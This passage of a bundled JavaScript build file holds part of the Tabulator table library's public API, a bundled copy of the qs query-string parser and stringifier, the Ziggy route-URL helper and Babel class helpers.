    var column = this.columnManager.findColumn(field);
    this.initGuard();
    return this.columnManager.addColumn(definition, before, column).then((column2) => {
      return column2.getComponent();
    });
  }
  deleteColumn(field) {
    var column = this.columnManager.findColumn(field);
    this.initGuard();
    if (column) {
      return column.delete();
    } else {
      console.warn("Column Delete Error - No matching column found:", field);
      return Promise.reject();
    }
  }
  updateColumnDefinition(field, definition) {
    var column = this.columnManager.findColumn(field);
    this.initGuard();
    if (column) {
      return column.updateDefinition(definition);
    } else {
      console.warn("Column Update Error - No matching column found:", field);
      return Promise.reject();
    }
  }
  moveColumn(from, to, after) {
    var fromColumn = this.columnManager.findColumn(from), toColumn = this.columnManager.findColumn(to);
    this.initGuard();
    if (fromColumn) {
      if (toColumn) {
        this.columnManager.moveColumn(fromColumn, toColumn, after);
      } else {
        console.warn("Move Error - No matching column found:", toColumn);
      }
    } else {
      console.warn("Move Error - No matching column found:", from);
    }
  }
  //scroll to column in DOM
  scrollToColumn(field, position, ifVisible) {
    return new Promise((resolve, reject) => {
      var column = this.columnManager.findColumn(field);
      if (column) {
        return this.columnManager.scrollToColumn(column, position, ifVisible);
      } else {
        console.warn("Scroll Error - No matching column found:", field);
        return Promise.reject("Scroll Error - No matching column found");
      }
    });
  }
  //////////// General Public Functions ////////////
  //redraw list without updating data
  redraw(force) {
    this.initGuard();
    this.columnManager.redraw(force);
    this.rowManager.redraw(force);
  }
  setHeight(height) {
    this.options.height = isNaN(height) ? height : height + "px";
    this.element.style.height = this.options.height;
    this.rowManager.initializeRenderer();
    this.rowManager.redraw(true);
  }
  //////////////////// Event Bus ///////////////////
  on(key, callback) {
    this.externalEvents.subscribe(key, callback);
  }
  off(key, callback) {
    this.externalEvents.unsubscribe(key, callback);
  }
  dispatchEvent() {
    var args = Array.from(arguments);
    args.shift();
    this.externalEvents.dispatch(...arguments);
  }
  //////////////////// Alerts ///////////////////
  alert(contents, type) {
    this.initGuard();
    this.alertManager.alert(contents, type);
  }
  clearAlert() {
    this.initGuard();
    this.alertManager.clear();
  }
  ////////////// Extension Management //////////////
  modExists(plugin, required) {
    if (this.modules[plugin]) {
      return true;
    } else {
      if (required) {
        console.error("Tabulator Module Not Installed: " + plugin);
      }
      return false;
    }
  }
  module(key) {
    var mod = this.modules[key];
    if (!mod) {
      console.error("Tabulator module not installed: " + key);
    }
    return mod;
  }
}
var Tabulator$1 = Tabulator;
class TabulatorFull extends Tabulator$1 {
  static extendModule() {
    Tabulator$1.initializeModuleBinder(allModules);
    Tabulator$1._extendModule(...arguments);
  }
  static registerModule() {
    Tabulator$1.initializeModuleBinder(allModules);
    Tabulator$1._registerModule(...arguments);
  }
  constructor(element, options, modules) {
    super(element, options, allModules);
  }
}
var TabulatorFull$1 = TabulatorFull;
function getDefaultExportFromCjs(x) {
  return x && x.__esModule && Object.prototype.hasOwnProperty.call(x, "default") ? x["default"] : x;
}
var replace = String.prototype.replace;
var percentTwenties = /%20/g;
var Format2 = {
  RFC1738: "RFC1738",
  RFC3986: "RFC3986"
};
var formats$3 = {
  "default": Format2.RFC3986,
  formatters: {
    RFC1738: function(value) {
      return replace.call(value, percentTwenties, "+");
    },
    RFC3986: function(value) {
      return String(value);
    }
  },
  RFC1738: Format2.RFC1738,
  RFC3986: Format2.RFC3986
};
var formats$2 = formats$3;
var has$2 = Object.prototype.hasOwnProperty;
var isArray$2 = Array.isArray;
var hexTable = function() {
  var array2 = [];
  for (var i2 = 0; i2 < 256; ++i2) {
    array2.push("%" + ((i2 < 16 ? "0" : "") + i2.toString(16)).toUpperCase());
  }
  return array2;
}();
var compactQueue = function compactQueue2(queue) {
  while (queue.length > 1) {
    var item = queue.pop();
    var obj = item.obj[item.prop];
    if (isArray$2(obj)) {
      var compacted = [];
      for (var j = 0; j < obj.length; ++j) {
        if (typeof obj[j] !== "undefined") {
          compacted.push(obj[j]);
        }
      }
      item.obj[item.prop] = compacted;
    }
  }
};
var arrayToObject = function arrayToObject2(source, options) {
  var obj = options && options.plainObjects ? /* @__PURE__ */ Object.create(null) : {};
  for (var i2 = 0; i2 < source.length; ++i2) {
    if (typeof source[i2] !== "undefined") {
      obj[i2] = source[i2];
    }
  }
  return obj;
};
var merge = function merge2(target, source, options) {
  if (!source) {
    return target;
  }
  if (typeof source !== "object") {
    if (isArray$2(target)) {
      target.push(source);
    } else if (target && typeof target === "object") {
      if (options && (options.plainObjects || options.allowPrototypes) || !has$2.call(Object.prototype, source)) {
        target[source] = true;
      }
    } else {
      return [target, source];
    }
    return target;
  }
  if (!target || typeof target !== "object") {
    return [target].concat(source);
  }
  var mergeTarget = target;
  if (isArray$2(target) && !isArray$2(source)) {
    mergeTarget = arrayToObject(target, options);
  }
  if (isArray$2(target) && isArray$2(source)) {
    source.forEach(function(item, i2) {
      if (has$2.call(target, i2)) {
        var targetItem = target[i2];
        if (targetItem && typeof targetItem === "object" && item && typeof item === "object") {
          target[i2] = merge2(targetItem, item, options);
        } else {
          target.push(item);
        }
      } else {
        target[i2] = item;
      }
    });
    return target;
  }
  return Object.keys(source).reduce(function(acc, key) {
    var value = source[key];
    if (has$2.call(acc, key)) {
      acc[key] = merge2(acc[key], value, options);
    } else {
      acc[key] = value;
    }
    return acc;
  }, mergeTarget);
};
var assign = function assignSingleSource(target, source) {
  return Object.keys(source).reduce(function(acc, key) {
    acc[key] = source[key];
    return acc;
  }, target);
};
var decode = function(str, decoder, charset) {
  var strWithoutPlus = str.replace(/\+/g, " ");
  if (charset === "iso-8859-1") {
    return strWithoutPlus.replace(/%[0-9a-f]{2}/gi, unescape);
  }
  try {
    return decodeURIComponent(strWithoutPlus);
  } catch (e2) {
    return strWithoutPlus;
  }
};
var encode = function encode2(str, defaultEncoder, charset, kind, format) {
  if (str.length === 0) {
    return str;
  }
  var string2 = str;
  if (typeof str === "symbol") {
    string2 = Symbol.prototype.toString.call(str);
  } else if (typeof str !== "string") {
    string2 = String(str);
  }
  if (charset === "iso-8859-1") {
    return escape(string2).replace(/%u[0-9a-f]{4}/gi, function($0) {
      return "%26%23" + parseInt($0.slice(2), 16) + "%3B";
    });
  }
  var out = "";
  for (var i2 = 0; i2 < string2.length; ++i2) {
    var c = string2.charCodeAt(i2);
    if (c === 45 || c === 46 || c === 95 || c === 126 || c >= 48 && c <= 57 || c >= 65 && c <= 90 || c >= 97 && c <= 122 || format === formats$2.RFC1738 && (c === 40 || c === 41)) {
      out += string2.charAt(i2);
      continue;
    }
    if (c < 128) {
      out = out + hexTable[c];
      continue;
    }
    if (c < 2048) {
      out = out + (hexTable[192 | c >> 6] + hexTable[128 | c & 63]);
      continue;
    }
    if (c < 55296 || c >= 57344) {
      out = out + (hexTable[224 | c >> 12] + hexTable[128 | c >> 6 & 63] + hexTable[128 | c & 63]);
      continue;
    }
    i2 += 1;
    c = 65536 + ((c & 1023) << 10 | string2.charCodeAt(i2) & 1023);
    out += hexTable[240 | c >> 18] + hexTable[128 | c >> 12 & 63] + hexTable[128 | c >> 6 & 63] + hexTable[128 | c & 63];
  }
  return out;
};
var compact = function compact2(value) {
  var queue = [{ obj: { o: value }, prop: "o" }];
  var refs = [];
  for (var i2 = 0; i2 < queue.length; ++i2) {
    var item = queue[i2];
    var obj = item.obj[item.prop];
    var keys = Object.keys(obj);
    for (var j = 0; j < keys.length; ++j) {
      var key = keys[j];
      var val = obj[key];
      if (typeof val === "object" && val !== null && refs.indexOf(val) === -1) {
        queue.push({ obj, prop: key });
        refs.push(val);
      }
    }
  }
  compactQueue(queue);
  return value;
};
var isRegExp = function isRegExp2(obj) {
  return Object.prototype.toString.call(obj) === "[object RegExp]";
};
var isBuffer = function isBuffer2(obj) {
  if (!obj || typeof obj !== "object") {
    return false;
  }
  return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));
};
var combine = function combine2(a, b) {
  return [].concat(a, b);
};
var maybeMap = function maybeMap2(val, fn2) {
  if (isArray$2(val)) {
    var mapped = [];
    for (var i2 = 0; i2 < val.length; i2 += 1) {
      mapped.push(fn2(val[i2]));
    }
    return mapped;
  }
  return fn2(val);
};
var utils$2 = {
  arrayToObject,
  assign,
  combine,
  compact,
  decode,
  encode,
  isBuffer,
  isRegExp,
  maybeMap,
  merge
};
var utils$1 = utils$2;
var formats$1 = formats$3;
var has$1 = Object.prototype.hasOwnProperty;
var arrayPrefixGenerators = {
  brackets: function brackets(prefix) {
    return prefix + "[]";
  },
  comma: "comma",
  indices: function indices(prefix, key) {
    return prefix + "[" + key + "]";
  },
  repeat: function repeat(prefix) {
    return prefix;
  }
};
var isArray$1 = Array.isArray;
var split = String.prototype.split;
var push = Array.prototype.push;
var pushToArray = function(arr, valueOrArray) {
  push.apply(arr, isArray$1(valueOrArray) ? valueOrArray : [valueOrArray]);
};
var toISO = Date.prototype.toISOString;
var defaultFormat = formats$1["default"];
var defaults$1 = {
  addQueryPrefix: false,
  allowDots: false,
  charset: "utf-8",
  charsetSentinel: false,
  delimiter: "&",
  encode: true,
  encoder: utils$1.encode,
  encodeValuesOnly: false,
  format: defaultFormat,
  formatter: formats$1.formatters[defaultFormat],
  // deprecated
  indices: false,
  serializeDate: function serializeDate(date2) {
    return toISO.call(date2);
  },
  skipNulls: false,
  strictNullHandling: false
};
var isNonNullishPrimitive = function isNonNullishPrimitive2(v) {
  return typeof v === "string" || typeof v === "number" || typeof v === "boolean" || typeof v === "symbol" || typeof v === "bigint";
};
var stringify$1 = function stringify(object, prefix, generateArrayPrefix, strictNullHandling, skipNulls, encoder, filter2, sort, allowDots, serializeDate2, format, formatter, encodeValuesOnly, charset) {
  var obj = object;
  if (typeof filter2 === "function") {
    obj = filter2(prefix, obj);
  } else if (obj instanceof Date) {
    obj = serializeDate2(obj);
  } else if (generateArrayPrefix === "comma" && isArray$1(obj)) {
    obj = utils$1.maybeMap(obj, function(value2) {
      if (value2 instanceof Date) {
        return serializeDate2(value2);
      }
      return value2;
    });
  }
  if (obj === null) {
    if (strictNullHandling) {
      return encoder && !encodeValuesOnly ? encoder(prefix, defaults$1.encoder, charset, "key", format) : prefix;
    }
    obj = "";
  }
  if (isNonNullishPrimitive(obj) || utils$1.isBuffer(obj)) {
    if (encoder) {
      var keyValue = encodeValuesOnly ? prefix : encoder(prefix, defaults$1.encoder, charset, "key", format);
      if (generateArrayPrefix === "comma" && encodeValuesOnly) {
        var valuesArray = split.call(String(obj), ",");
        var valuesJoined = "";
        for (var i2 = 0; i2 < valuesArray.length; ++i2) {
          valuesJoined += (i2 === 0 ? "" : ",") + formatter(encoder(valuesArray[i2], defaults$1.encoder, charset, "value", format));
        }
        return [formatter(keyValue) + "=" + valuesJoined];
      }
      return [formatter(keyValue) + "=" + formatter(encoder(obj, defaults$1.encoder, charset, "value", format))];
    }
    return [formatter(prefix) + "=" + formatter(String(obj))];
  }
  var values = [];
  if (typeof obj === "undefined") {
    return values;
  }
  var objKeys;
  if (generateArrayPrefix === "comma" && isArray$1(obj)) {
    objKeys = [{ value: obj.length > 0 ? obj.join(",") || null : void 0 }];
  } else if (isArray$1(filter2)) {
    objKeys = filter2;
  } else {
    var keys = Object.keys(obj);
    objKeys = sort ? keys.sort(sort) : keys;
  }
  for (var j = 0; j < objKeys.length; ++j) {
    var key = objKeys[j];
    var value = typeof key === "object" && typeof key.value !== "undefined" ? key.value : obj[key];
    if (skipNulls && value === null) {
      continue;
    }
    var keyPrefix = isArray$1(obj) ? typeof generateArrayPrefix === "function" ? generateArrayPrefix(prefix, key) : prefix : prefix + (allowDots ? "." + key : "[" + key + "]");
    pushToArray(values, stringify(
      value,
      keyPrefix,
      generateArrayPrefix,
      strictNullHandling,
      skipNulls,
      encoder,
      filter2,
      sort,
      allowDots,
      serializeDate2,
      format,
      formatter,
      encodeValuesOnly,
      charset
    ));
  }
  return values;
};
var normalizeStringifyOptions = function normalizeStringifyOptions2(opts) {
  if (!opts) {
    return defaults$1;
  }
  if (opts.encoder !== null && typeof opts.encoder !== "undefined" && typeof opts.encoder !== "function") {
    throw new TypeError("Encoder has to be a function.");
  }
  var charset = opts.charset || defaults$1.charset;
  if (typeof opts.charset !== "undefined" && opts.charset !== "utf-8" && opts.charset !== "iso-8859-1") {
    throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");
  }
  var format = formats$1["default"];
  if (typeof opts.format !== "undefined") {
    if (!has$1.call(formats$1.formatters, opts.format)) {
      throw new TypeError("Unknown format option provided.");
    }
    format = opts.format;
  }
  var formatter = formats$1.formatters[format];
  var filter2 = defaults$1.filter;
  if (typeof opts.filter === "function" || isArray$1(opts.filter)) {
    filter2 = opts.filter;
  }
  return {
    addQueryPrefix: typeof opts.addQueryPrefix === "boolean" ? opts.addQueryPrefix : defaults$1.addQueryPrefix,
    allowDots: typeof opts.allowDots === "undefined" ? defaults$1.allowDots : !!opts.allowDots,
    charset,
    charsetSentinel: typeof opts.charsetSentinel === "boolean" ? opts.charsetSentinel : defaults$1.charsetSentinel,
    delimiter: typeof opts.delimiter === "undefined" ? defaults$1.delimiter : opts.delimiter,
    encode: typeof opts.encode === "boolean" ? opts.encode : defaults$1.encode,
    encoder: typeof opts.encoder === "function" ? opts.encoder : defaults$1.encoder,
    encodeValuesOnly: typeof opts.encodeValuesOnly === "boolean" ? opts.encodeValuesOnly : defaults$1.encodeValuesOnly,
    filter: filter2,
    format,
    formatter,
    serializeDate: typeof opts.serializeDate === "function" ? opts.serializeDate : defaults$1.serializeDate,
    skipNulls: typeof opts.skipNulls === "boolean" ? opts.skipNulls : defaults$1.skipNulls,
    sort: typeof opts.sort === "function" ? opts.sort : null,
    strictNullHandling: typeof opts.strictNullHandling === "boolean" ? opts.strictNullHandling : defaults$1.strictNullHandling
  };
};
var stringify_1 = function(object, opts) {
  var obj = object;
  var options = normalizeStringifyOptions(opts);
  var objKeys;
  var filter2;
  if (typeof options.filter === "function") {
    filter2 = options.filter;
    obj = filter2("", obj);
  } else if (isArray$1(options.filter)) {
    filter2 = options.filter;
    objKeys = filter2;
  }
  var keys = [];
  if (typeof obj !== "object" || obj === null) {
    return "";
  }
  var arrayFormat;
  if (opts && opts.arrayFormat in arrayPrefixGenerators) {
    arrayFormat = opts.arrayFormat;
  } else if (opts && "indices" in opts) {
    arrayFormat = opts.indices ? "indices" : "repeat";
  } else {
    arrayFormat = "indices";
  }
  var generateArrayPrefix = arrayPrefixGenerators[arrayFormat];
  if (!objKeys) {
    objKeys = Object.keys(obj);
  }
  if (options.sort) {
    objKeys.sort(options.sort);
  }
  for (var i2 = 0; i2 < objKeys.length; ++i2) {
    var key = objKeys[i2];
    if (options.skipNulls && obj[key] === null) {
      continue;
    }
    pushToArray(keys, stringify$1(
      obj[key],
      key,
      generateArrayPrefix,
      options.strictNullHandling,
      options.skipNulls,
      options.encode ? options.encoder : null,
      options.filter,
      options.sort,
      options.allowDots,
      options.serializeDate,
      options.format,
      options.formatter,
      options.encodeValuesOnly,
      options.charset
    ));
  }
  var joined = keys.join(options.delimiter);
  var prefix = options.addQueryPrefix === true ? "?" : "";
  if (options.charsetSentinel) {
    if (options.charset === "iso-8859-1") {
      prefix += "utf8=%26%2310003%3B&";
    } else {
      prefix += "utf8=%E2%9C%93&";
    }
  }
  return joined.length > 0 ? prefix + joined : "";
};
var utils = utils$2;
var has = Object.prototype.hasOwnProperty;
var isArray = Array.isArray;
var defaults = {
  allowDots: false,
  allowPrototypes: false,
  arrayLimit: 20,
  charset: "utf-8",
  charsetSentinel: false,
  comma: false,
  decoder: utils.decode,
  delimiter: "&",
  depth: 5,
  ignoreQueryPrefix: false,
  interpretNumericEntities: false,
  parameterLimit: 1e3,
  parseArrays: true,
  plainObjects: false,
  strictNullHandling: false
};
var interpretNumericEntities = function(str) {
  return str.replace(/&#(\d+);/g, function($0, numberStr) {
    return String.fromCharCode(parseInt(numberStr, 10));
  });
};
var parseArrayValue = function(val, options) {
  if (val && typeof val === "string" && options.comma && val.indexOf(",") > -1) {
    return val.split(",");
  }
  return val;
};
var isoSentinel = "utf8=%26%2310003%3B";
var charsetSentinel = "utf8=%E2%9C%93";
var parseValues = function parseQueryStringValues(str, options) {
  var obj = {};
  var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\?/, "") : str;
  var limit = options.parameterLimit === Infinity ? void 0 : options.parameterLimit;
  var parts = cleanStr.split(options.delimiter, limit);
  var skipIndex = -1;
  var i2;
  var charset = options.charset;
  if (options.charsetSentinel) {
    for (i2 = 0; i2 < parts.length; ++i2) {
      if (parts[i2].indexOf("utf8=") === 0) {
        if (parts[i2] === charsetSentinel) {
          charset = "utf-8";
        } else if (parts[i2] === isoSentinel) {
          charset = "iso-8859-1";
        }
        skipIndex = i2;
        i2 = parts.length;
      }
    }
  }
  for (i2 = 0; i2 < parts.length; ++i2) {
    if (i2 === skipIndex) {
      continue;
    }
    var part = parts[i2];
    var bracketEqualsPos = part.indexOf("]=");
    var pos = bracketEqualsPos === -1 ? part.indexOf("=") : bracketEqualsPos + 1;
    var key, val;
    if (pos === -1) {
      key = options.decoder(part, defaults.decoder, charset, "key");
      val = options.strictNullHandling ? null : "";
    } else {
      key = options.decoder(part.slice(0, pos), defaults.decoder, charset, "key");
      val = utils.maybeMap(
        parseArrayValue(part.slice(pos + 1), options),
        function(encodedVal) {
          return options.decoder(encodedVal, defaults.decoder, charset, "value");
        }
      );
    }
    if (val && options.interpretNumericEntities && charset === "iso-8859-1") {
      val = interpretNumericEntities(val);
    }
    if (part.indexOf("[]=") > -1) {
      val = isArray(val) ? [val] : val;
    }
    if (has.call(obj, key)) {
      obj[key] = utils.combine(obj[key], val);
    } else {
      obj[key] = val;
    }
  }
  return obj;
};
var parseObject = function(chain, val, options, valuesParsed) {
  var leaf = valuesParsed ? val : parseArrayValue(val, options);
  for (var i2 = chain.length - 1; i2 >= 0; --i2) {
    var obj;
    var root = chain[i2];
    if (root === "[]" && options.parseArrays) {
      obj = [].concat(leaf);
    } else {
      obj = options.plainObjects ? /* @__PURE__ */ Object.create(null) : {};
      var cleanRoot = root.charAt(0) === "[" && root.charAt(root.length - 1) === "]" ? root.slice(1, -1) : root;
      var index = parseInt(cleanRoot, 10);
      if (!options.parseArrays && cleanRoot === "") {
        obj = { 0: leaf };
      } else if (!isNaN(index) && root !== cleanRoot && String(index) === cleanRoot && index >= 0 && (options.parseArrays && index <= options.arrayLimit)) {
        obj = [];
        obj[index] = leaf;
      } else if (cleanRoot !== "__proto__") {
        obj[cleanRoot] = leaf;
      }
    }
    leaf = obj;
  }
  return leaf;
};
var parseKeys = function parseQueryStringKeys(givenKey, val, options, valuesParsed) {
  if (!givenKey) {
    return;
  }
  var key = options.allowDots ? givenKey.replace(/\.([^.[]+)/g, "[$1]") : givenKey;
  var brackets2 = /(\[[^[\]]*])/;
  var child = /(\[[^[\]]*])/g;
  var segment = options.depth > 0 && brackets2.exec(key);
  var parent = segment ? key.slice(0, segment.index) : key;
  var keys = [];
  if (parent) {
    if (!options.plainObjects && has.call(Object.prototype, parent)) {
      if (!options.allowPrototypes) {
        return;
      }
    }
    keys.push(parent);
  }
  var i2 = 0;
  while (options.depth > 0 && (segment = child.exec(key)) !== null && i2 < options.depth) {
    i2 += 1;
    if (!options.plainObjects && has.call(Object.prototype, segment[1].slice(1, -1))) {
      if (!options.allowPrototypes) {
        return;
      }
    }
    keys.push(segment[1]);
  }
  if (segment) {
    keys.push("[" + key.slice(segment.index) + "]");
  }
  return parseObject(keys, val, options, valuesParsed);
};
var normalizeParseOptions = function normalizeParseOptions2(opts) {
  if (!opts) {
    return defaults;
  }
  if (opts.decoder !== null && opts.decoder !== void 0 && typeof opts.decoder !== "function") {
    throw new TypeError("Decoder has to be a function.");
  }
  if (typeof opts.charset !== "undefined" && opts.charset !== "utf-8" && opts.charset !== "iso-8859-1") {
    throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");
  }
  var charset = typeof opts.charset === "undefined" ? defaults.charset : opts.charset;
  return {
    allowDots: typeof opts.allowDots === "undefined" ? defaults.allowDots : !!opts.allowDots,
    allowPrototypes: typeof opts.allowPrototypes === "boolean" ? opts.allowPrototypes : defaults.allowPrototypes,
    arrayLimit: typeof opts.arrayLimit === "number" ? opts.arrayLimit : defaults.arrayLimit,
    charset,
    charsetSentinel: typeof opts.charsetSentinel === "boolean" ? opts.charsetSentinel : defaults.charsetSentinel,
    comma: typeof opts.comma === "boolean" ? opts.comma : defaults.comma,
    decoder: typeof opts.decoder === "function" ? opts.decoder : defaults.decoder,
    delimiter: typeof opts.delimiter === "string" || utils.isRegExp(opts.delimiter) ? opts.delimiter : defaults.delimiter,
    // eslint-disable-next-line no-implicit-coercion, no-extra-parens
    depth: typeof opts.depth === "number" || opts.depth === false ? +opts.depth : defaults.depth,
    ignoreQueryPrefix: opts.ignoreQueryPrefix === true,
    interpretNumericEntities: typeof opts.interpretNumericEntities === "boolean" ? opts.interpretNumericEntities : defaults.interpretNumericEntities,
    parameterLimit: typeof opts.parameterLimit === "number" ? opts.parameterLimit : defaults.parameterLimit,
    parseArrays: opts.parseArrays !== false,
    plainObjects: typeof opts.plainObjects === "boolean" ? opts.plainObjects : defaults.plainObjects,
    strictNullHandling: typeof opts.strictNullHandling === "boolean" ? opts.strictNullHandling : defaults.strictNullHandling
  };
};
var parse$1 = function(str, opts) {
  var options = normalizeParseOptions(opts);
  if (str === "" || str === null || typeof str === "undefined") {
    return options.plainObjects ? /* @__PURE__ */ Object.create(null) : {};
  }
  var tempObj = typeof str === "string" ? parseValues(str, options) : str;
  var obj = options.plainObjects ? /* @__PURE__ */ Object.create(null) : {};
  var keys = Object.keys(tempObj);
  for (var i2 = 0; i2 < keys.length; ++i2) {
    var key = keys[i2];
    var newObj = parseKeys(key, tempObj[key], options, typeof str === "string");
    obj = utils.merge(obj, newObj, options);
  }
  return utils.compact(obj);
};
var stringify2 = stringify_1;
var parse = parse$1;
var formats = formats$3;
var lib = {
  formats,
  parse,
  stringify: stringify2
};
function e() {
  return e = Object.assign ? Object.assign.bind() : function(t) {
    for (var r = 1; r < arguments.length; r++) {
      var e2 = arguments[r];
      for (var i2 in e2) ({}).hasOwnProperty.call(e2, i2) && (t[i2] = e2[i2]);
    }
    return t;
  }, e.apply(null, arguments);
}
class i {
  constructor(t, r, e2) {
    var i2, n2;
    this.name = t, this.definition = r, this.bindings = null != (i2 = r.bindings) ? i2 : {}, this.wheres = null != (n2 = r.wheres) ? n2 : {}, this.config = e2;
  }
  get template() {
    const t = `${this.origin}/${this.definition.uri}`.replace(/\/+$/, "");
    return "" === t ? "/" : t;
  }
  get origin() {
    return this.config.absolute ? this.definition.domain ? `${this.config.url.match(/^\w+:\/\//)[0]}${this.definition.domain}${this.config.port ? `:${this.config.port}` : ""}` : this.config.url : "";
  }
  get parameterSegments() {
    var t, r;
    return null != (t = null == (r = this.template.match(/{[^}?]+\??}/g)) ? void 0 : r.map((t2) => ({ name: t2.replace(/{|\??}/g, ""), required: !/\?}$/.test(t2) }))) ? t : [];
  }
  matchesUrl(r) {
    var e2;
    if (!this.definition.methods.includes("GET")) return false;
    const i2 = this.template.replace(/[.*+$()[\]]/g, "\\$&").replace(/(\/?){([^}?]*)(\??)}/g, (t, r2, e3, i3) => {
      var n3;
      const s3 = `(?<${e3}>${(null == (n3 = this.wheres[e3]) ? void 0 : n3.replace(/(^\^)|(\$$)/g, "")) || "[^/?]+"})`;
      return i3 ? `(${r2}${s3})?` : `${r2}${s3}`;
    }).replace(/^\w+:\/\//, ""), [n2, s2] = r.replace(/^\w+:\/\//, "").split("?"), o = null != (e2 = new RegExp(`^${i2}/?$`).exec(n2)) ? e2 : new RegExp(`^${i2}/?$`).exec(decodeURI(n2));
    if (o) {
      for (const t in o.groups) o.groups[t] = "string" == typeof o.groups[t] ? decodeURIComponent(o.groups[t]) : o.groups[t];
      return { params: o.groups, query: lib.parse(s2) };
    }
    return false;
  }
  compile(t) {
    return this.parameterSegments.length ? this.template.replace(/{([^}?]+)(\??)}/g, (r, e2, i2) => {
      var n2, s2;
      if (!i2 && [null, void 0].includes(t[e2])) throw new Error(`Ziggy error: '${e2}' parameter is required for route '${this.name}'.`);
      if (this.wheres[e2] && !new RegExp(`^${i2 ? `(${this.wheres[e2]})?` : this.wheres[e2]}$`).test(null != (s2 = t[e2]) ? s2 : "")) throw new Error(`Ziggy error: '${e2}' parameter '${t[e2]}' does not match required format '${this.wheres[e2]}' for route '${this.name}'.`);
      return encodeURI(null != (n2 = t[e2]) ? n2 : "").replace(/%7C/g, "|").replace(/%25/g, "%").replace(/\$/g, "%24");
    }).replace(this.config.absolute ? /(\.[^/]+?)(\/\/)/ : /(^)(\/\/)/, "$1/").replace(/\/+$/, "") : this.template;
  }
}
class n extends String {
  constructor(t, r, n2 = true, s2) {
    if (super(), this.t = null != s2 ? s2 : "undefined" != typeof Ziggy ? Ziggy : null == globalThis ? void 0 : globalThis.Ziggy, this.t = e({}, this.t, { absolute: n2 }), t) {
      if (!this.t.routes[t]) throw new Error(`Ziggy error: route '${t}' is not in the route list.`);
      this.i = new i(t, this.t.routes[t], this.t), this.o = this.u(r);
    }
  }
  toString() {
    const t = Object.keys(this.o).filter((t2) => !this.i.parameterSegments.some(({ name: r }) => r === t2)).filter((t2) => "_query" !== t2).reduce((t2, r) => e({}, t2, { [r]: this.o[r] }), {});
    return this.i.compile(this.o) + lib.stringify(e({}, t, this.o._query), { addQueryPrefix: true, arrayFormat: "indices", encodeValuesOnly: true, skipNulls: true, encoder: (t2, r) => "boolean" == typeof t2 ? Number(t2) : r(t2) });
  }
  h(t) {
    t ? this.t.absolute && t.startsWith("/") && (t = this.l().host + t) : t = this.m();
    let r = {};
    const [n2, s2] = Object.entries(this.t.routes).find(([e2, n3]) => r = new i(e2, n3, this.t).matchesUrl(t)) || [void 0, void 0];
    return e({ name: n2 }, r, { route: s2 });
  }
  m() {
    const { host: t, pathname: r, search: e2 } = this.l();
    return (this.t.absolute ? t + r : r.replace(this.t.url.replace(/^\w*:\/\/[^/]+/, ""), "").replace(/^\/+/, "/")) + e2;
  }
  current(t, r) {
    const { name: n2, params: s2, query: o, route: u } = this.h();
    if (!t) return n2;
    const h = new RegExp(`^${t.replace(/\./g, "\\.").replace(/\*/g, ".*")}$`).test(n2);
    if ([null, void 0].includes(r) || !h) return h;
    const a = new i(n2, u, this.t);
    r = this.u(r, a);
    const l2 = e({}, s2, o);
    if (Object.values(r).every((t2) => !t2) && !Object.values(l2).some((t2) => void 0 !== t2)) return true;
    const c = (t2, r2) => Object.entries(t2).every(([t3, e2]) => Array.isArray(e2) && Array.isArray(r2[t3]) ? e2.every((e3) => r2[t3].includes(e3)) : "object" == typeof e2 && "object" == typeof r2[t3] && null !== e2 && null !== r2[t3] ? c(e2, r2[t3]) : r2[t3] == e2);
    return c(r, l2);
  }
  l() {
    var t, r, e2, i2, n2, s2;
    const { host: o = "", pathname: u = "", search: h = "" } = "undefined" != typeof window ? window.location : {};
    return { host: null != (t = null == (r = this.t.location) ? void 0 : r.host) ? t : o, pathname: null != (e2 = null == (i2 = this.t.location) ? void 0 : i2.pathname) ? e2 : u, search: null != (n2 = null == (s2 = this.t.location) ? void 0 : s2.search) ? n2 : h };
  }
  get params() {
    const { params: t, query: r } = this.h();
    return e({}, t, r);
  }
  get routeParams() {
    return this.h().params;
  }
  get queryParams() {
    return this.h().query;
  }
  has(t) {
    return this.t.routes.hasOwnProperty(t);
  }
  u(t = {}, r = this.i) {
    null != t || (t = {}), t = ["string", "number"].includes(typeof t) ? [t] : t;
    const i2 = r.parameterSegments.filter(({ name: t2 }) => !this.t.defaults[t2]);
    return Array.isArray(t) ? t = t.reduce((t2, r2, n2) => e({}, t2, i2[n2] ? { [i2[n2].name]: r2 } : "object" == typeof r2 ? r2 : { [r2]: "" }), {}) : 1 !== i2.length || t[i2[0].name] || !t.hasOwnProperty(Object.values(r.bindings)[0]) && !t.hasOwnProperty("id") || (t = { [i2[0].name]: t }), e({}, this.$(r), this.p(t, r));
  }
  $(t) {
    return t.parameterSegments.filter(({ name: t2 }) => this.t.defaults[t2]).reduce((t2, { name: r }, i2) => e({}, t2, { [r]: this.t.defaults[r] }), {});
  }
  p(t, { bindings: r, parameterSegments: i2 }) {
    return Object.entries(t).reduce((t2, [n2, s2]) => {
      if (!s2 || "object" != typeof s2 || Array.isArray(s2) || !i2.some(({ name: t3 }) => t3 === n2)) return e({}, t2, { [n2]: s2 });
      if (!s2.hasOwnProperty(r[n2])) {
        if (!s2.hasOwnProperty("id")) throw new Error(`Ziggy error: object passed as '${n2}' parameter is missing route model binding key '${r[n2]}'.`);
        r[n2] = "id";
      }
      return e({}, t2, { [n2]: s2[r[n2]] });
    }, {});
  }
  valueOf() {
    return this.toString();
  }
}
function s(t, r, e2, i2) {
  const s2 = new n(t, r, e2, i2);
  return t ? s2.toString() : s2;
}
function _typeof(obj) {
  "@babel/helpers - typeof";
  return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(obj2) {
    return typeof obj2;
  } : function(obj2) {
    return obj2 && "function" == typeof Symbol && obj2.constructor === Symbol && obj2 !== Symbol.prototype ? "symbol" : typeof obj2;
  }, _typeof(obj);
}
function _classCallCheck(instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError("Cannot call a class as a function");
  }
}
function _defineProperties(target, props) {
  for (var i2 = 0; i2 < props.length; i2++) {
    var descriptor = props[i2];
    descriptor.enumerable = descriptor.enumerable || false;
    descriptor.configurable = true;
    if ("value" in descriptor) descriptor.writable = true;
    Object.defineProperty(target, descriptor.key, descriptor);
  }
}
function _createClass(Constructor, protoProps, staticProps) {
  if (protoProps) _defineProperties(Constructor.prototype, protoProps);
  Object.defineProperty(Constructor, "prototype", {
    writable: false
  });
  return Constructor;
}
